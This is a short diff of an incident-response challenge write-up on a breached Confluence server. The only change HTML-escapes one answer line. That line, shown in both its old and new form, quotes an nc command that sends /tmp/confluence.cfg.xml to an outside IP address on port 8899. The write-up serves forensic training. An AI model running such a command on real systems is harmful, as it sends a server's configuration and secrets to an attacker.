@@ -193,7 +193,7 @@ By using `linux_netstat` plugin then we can see that the webserver established R
 One of the file that was exfiltrated is `confluenc.cfg.xml` which is the Confluence configuration file.
 <details>
   <summary>Answer</summary>
-<pre><code>nc -w 3 172.233.24.11 8899 < /tmp/confluence.cfg.xml</code></pre>
+<pre><code>nc -w 3 172.233.24.11 8899 &lt; /tmp/confluence.cfg.xml</code></pre>
 </details>
 
 >Q13) What is the software used on the misconfigured exfiltration FTP Server (don’t include version), port, valid username, and valid password? (Format: software, port, username, password)  
